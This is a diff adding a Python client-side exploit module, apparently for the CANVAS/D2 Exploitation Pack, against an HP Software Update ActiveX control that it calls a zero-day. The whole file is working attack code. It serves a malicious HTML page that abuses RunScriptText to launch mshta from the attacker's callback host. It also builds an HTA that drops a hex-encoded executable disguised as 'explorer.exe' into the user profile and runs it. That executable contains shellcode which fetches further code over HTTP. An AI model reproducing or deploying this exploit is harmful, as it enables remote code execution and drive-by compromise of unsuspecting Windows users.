@@ -1,0 +1,229 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from canvasexploit import canvasexploit
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import canvasengine
+import struct
+import os
+
+# GUI info
+NAME = "[0 Day] HP Software Update RulesEngine.dll ActiveX Arbitrary Code Execution Vulnerability"
+
+DESCRIPTION = "Arbitrary Code Execution Vulnerability in HP Software Update RulesEngine.dll ActiveX"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "Not Public"
+DOCUMENTATION["Versions Affected"] = "HP Software Update 4.0.5.7"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['2000','XP']
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 1
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_hprules -l 192.168.41.1 -d 443 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0:['Windows 2000 SP4, XP SP0-SP2 with IE'],
+}
+
+	
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.name = NAME 
+        self.filename = "index.html"
+        self.trojanname = "index.hta"
+        return
+
+    def makefile(self):
+        filedata = """
+<HTML> 
+<BODY>
+ 
+<DIV id="targetDiv">
+
+</DIV>
+
+<SCRIPT language="javascript">  
+
+try {		
+	var detect = new ActiveXObject("HPRulesEngine.ScriptUtil.1");
+	
+	if (detect) {	
+		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:DF1F1C17-6A29-45FB-A3C6-9825908E062E' id='target'></object>";	
+							
+		data = 'Dim wShell\\r\\nSet wShell = CreateObject("WScript.Shell")\\r\\nwShell.Run "mshta.exe MOSDEFTROJANURL", 0, 0';
+		target.RunScriptText(data, "VBScript");		
+	}
+}
+catch(e) {}
+
+</SCRIPT> 
+
+</BODY> 
+</HTML>                
+""".replace("MOSDEFTROJANURL", "http://" + self.callback.ip + "/" + self.trojanname)        
+
+	if self.useSSL:
+        	filedata = filedata.replace('http:', 'https:')
+
+        return filedata
+
+    def file4hta(self, exename):
+    	evilprog = "explorer.exe"
+        e = []
+        for a in exename:
+	  for b in a:
+	    if b == "\r":
+	      d = "0d"
+	    elif b == "\n":
+	      d = "0a"
+	    elif b == "\0":
+	      d = "00"
+	    else:
+	      c = hex(ord(b))
+	      d = c.replace("0x", "")
+
+	    if len(d) == 1:
+	      d = "0"+d
+
+	    e.append(d)
+	
+	i = 0
+	j = 0
+	l = len(e)
+
+	hta = "<SCRIPT language=vbs>\n\n"
+	while 1:
+	  hta += " prog = prog & \""
+
+	  while i != 24:
+	    hta += "%s," % e[j]
+	    if j == l-1:
+	      break
+	    i += 1
+	    j += 1
+
+	  if j == l-1:
+	    hta = hta[:-1] + "\"\n\n"
+	    break
+	  hta += "\"\n"
+	  i = 0
+
+	hta += " tmp = Split(prog, \",\")\n"	
+	hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+	hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+	hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+	hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+	hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+	hta += " For i = 0 To UBound(tmp)\n"
+	hta += "   prog = Int(\"&H\" & tmp(i))\n"
+	hta += "   f.Write Chr(prog)\n"
+	hta += " Next\n\n"
+	hta += " f.Close\n"
+	hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+	hta += " self.Close\n"
+	hta += "</SCRIPT>\n"
+
+	return hta 
+
+    def maketrojan(self):
+        host = self.callback.ip
+        port = self.callback.port
+
+	sc = shellcodeGenerator.win32()
+        sc.addAttr("findeipnoesp", {"subespval":0x1000})                
+                	
+        if self.useSSL:
+            ssl = "s"
+        else:
+            ssl = ""                
+            
+        sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
+	shellcode = sc.get()        
+	myPElib = pelib.PElib()
+	
+	self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
+        
+        self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojanname))
+
+        self.htafile = self.file4hta(self.mosdeftrojan)
+        file(self.trojanname, "wb").write(self.htafile)
+        self.setInfo("%s - done" % (NAME))
+        ret = len(self.mosdeftrojan) != 0
+        
+        return ret
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()
+        
+        self.maketrojan()
+        
+        if clientheader.URL.count(self.filename):                        
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)
+            
+        elif clientheader.URL.count(self.trojanname):
+            self.log("Sending MOSDEF trojan")
+            f = open(self.trojanname, "rb")
+            sploitstring = f.read()
+            f.close()
+            os.remove(self.trojanname)
+            self.log("Sending %d bytes"%len(sploitstring))
+            h.addHeader("Content-type","binary/octet-stream")
+            h.addHeader("Connection","close")
+            b.setBody(sploitstring)
+               
+        else:
+            self.log("Redirecting to self")
+            h.status = "302"
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+            
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
